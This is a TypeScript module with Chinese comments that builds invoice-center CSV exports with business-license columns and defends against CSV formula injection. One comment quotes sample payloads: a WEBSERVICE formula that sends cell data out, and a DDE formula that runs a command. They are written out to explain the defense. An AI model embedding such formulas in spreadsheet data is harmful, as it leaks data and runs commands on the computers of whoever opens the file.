/**
 * 发票中心导出的 CSV 组装（纯函数，主进程与单测共用）。
 *
 * 单独抽出来的原因：导出要弹保存框，端到端脚本没法自动点它，
 * 「CSV 里到底有没有营业执照两列」就只能靠这份纯函数来钉住。
 *
 * 为什么导出也带营业执照：导出的表是拿去**报税/交给代账**的，代账按主体分账，
 * 只有「店铺」这一列他们得再问一遍哪家店属于哪个公司。
 */

import { isPendingSection } from './constants/invoice'
import { licenseLabelOf, normalizeLicenseNo, type StoreLicenseFields } from './store-license'

/** 导出行里只用到这几个字段（避免和主进程的完整类型耦合） */
interface ExportableSection {
  name: string
  items: Array<{ cells?: Record<string, string>; extras?: Array<{ label: string; value: string }> }>
}

interface ExportableRow extends StoreLicenseFields {
  storeName: string
  platform: string
  sections: ExportableSection[]
}

export interface ExportableStore extends StoreLicenseFields {
  storeName: string
  platform: string
}

/** 发票中心的统一展示列（与 constants/invoice 的 INVOICE_COLUMNS 同形） */
export interface InvoiceExportColumn {
  key: string
  label: string
}

/**
 * 拍平成"一行一条发票记录"。列顺序固定：店铺 / 平台 / 营业执照 / 统一社会信用代码 / 开票方向 / 统一列…/ 其他信息。
 * 没填营业执照的店写「未填写」，而不是留空——留空在表格里和"漏导出"看不出区别。
 */
export function invoiceCsvRows(
  rows: ExportableRow[],
  columns: readonly InvoiceExportColumn[]
): Array<Record<string, string>> {
  return rows.flatMap(r =>
    (r.sections || []).flatMap(sec =>
      (sec.items || []).map(it => ({
        店铺: r.storeName,
        平台: r.platform,
        营业执照: licenseLabelOf(r) || '未填写',
        统一社会信用代码: normalizeLicenseNo(r.licenseNo),
        开票方向: sec.name,
        ...Object.fromEntries(columns.map(c => [c.label, it.cells?.[c.key] ?? ''])),
        其他信息: (it.extras || []).map(x => `${x.label}：${x.value}`).join('；'),
        // B2（2026-10-14）：这一列放在**最后**，不动代账已经习惯的前 14 列顺序。
        // 为什么必须有它：导出包含 pending:false 的方向（快手「开票处理中/处理记录」= 已提交、商家无需操作），
        // 而文件名与界面合计都叫"待开票"——没有这一列，代账会把已提交的账单再算一遍。
        // "算不算待办"用 shared 的 isPendingSection（与界面合计、主进程统计同一份规则）。
        是否待办: isPendingSection(sec as { pending?: boolean }) ? '待开票' : '无需操作'
      }))
    )
  )
}

/**
 * 中和 CSV 公式注入：Excel / WPS 会把 `=` `+` `-` `@` 开头的单元格当**公式**执行
 * （`=WEBSERVICE("https://…"&A2)` 能把同文件其它单元格发出去；`=cmd|'/c calc'!A0` 走 DDE）。
 *
 * 为什么这里真的会中招：拼多多「订单开票」这一方向是**买家发起**的，发票抬头 / 企业税号 / 其他信息
 * 由买家填写、原样渲染在商家后台页面上，被 readTable 整表读回后原样进 CSV；而这份 CSV 的既定用途
 * 就是"报税 / 交给代账"（必然被 Excel/WPS 打开）。
 *
 * 为什么不能无脑加前缀：金额列本来就有负数（退款/冲正，如 `-12.50`），
 * 给纯数字加前缀会让代账那侧的求和直接失效。所以只中和"看起来是公式"的：
 * `=` `+` `@` 制表符/回车开头一律加 `'`；`-` 开头但不是纯数字的也加。
 * （加 `'` 后单元格内容会多一个前导单引号——这是 OWASP 对 CSV 注入的标准缓解手段，
 *   用"多一个不可见字符"换"打开文件就执行公式"，这个交换是值得的。）
 */
export function neutralizeCsvFormula(s: string): string {
  if (!s) return s
  if (/^[=+@\t\r]/.test(s)) return "'" + s
  if (s.startsWith('-') && !/^-?\d+(?:\.\d+)?$/.test(s)) return "'" + s
  return s
}

/** CSV 单元格转义：先中和公式，再按需加引号（含逗号/引号/换行一律加引号，内部引号翻倍） */
export function escapeCsvCell(v: unknown): string {
  const s = neutralizeCsvFormula(String(v ?? ''))
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}

/**
 * 导出保存框的路径补全：不是 `.csv` 结尾（大小写不敏感）就补上 `.csv`。
 *
 * 为什么需要：保存框的 `filters` 只影响展示，用户仍可能在文件名里输入 `报表` 或 `报表.txt`，
 * 里面却是 CSV 内容——后者在记事本里像文本、在 Excel 里又和双击 `.csv` 的打开方式不同，
 * 而且失败时（如容器环境双击打不开）很难判断"到底该用什么打开"（2026-10-15 审查 C6）。
 * 补全而不是校验拒绝：不打断用户已经输入的文件名，只在末尾把它变成明确的 `.csv`。
 */
export function ensureCsvExtension(filePath: string): string {
  return /\.csv$/i.test(filePath) ? filePath : `${filePath}.csv`
}

/**
 * 拼成 CSV 文本。带 UTF-8 BOM——否则 Excel 打开中文会乱码（实测过）。
 * 列名取第一行的 key 顺序，所以 `invoiceCsvRows` 决定了列顺序。
 *
 * P2-8：表头也走 `escapeCsvCell`。现在的列名里没有逗号，但列名是**可扩展的**
 * （INVOICE_COLUMNS 加一列带逗号的标签就会把整行列数撑歪，且 Excel 不会报错，只是错位）。
 */
export function buildInvoiceCsv(dataRows: Array<Record<string, string>>): string {
  if (!dataRows.length) return '\uFEFF'
  const headers = Object.keys(dataRows[0])
  return '\uFEFF' + [
    headers.map(h => escapeCsvCell(h)).join(','),
    ...dataRows.map(r => headers.map(h => escapeCsvCell(r[h])).join(','))
  ].join('\r\n')
}
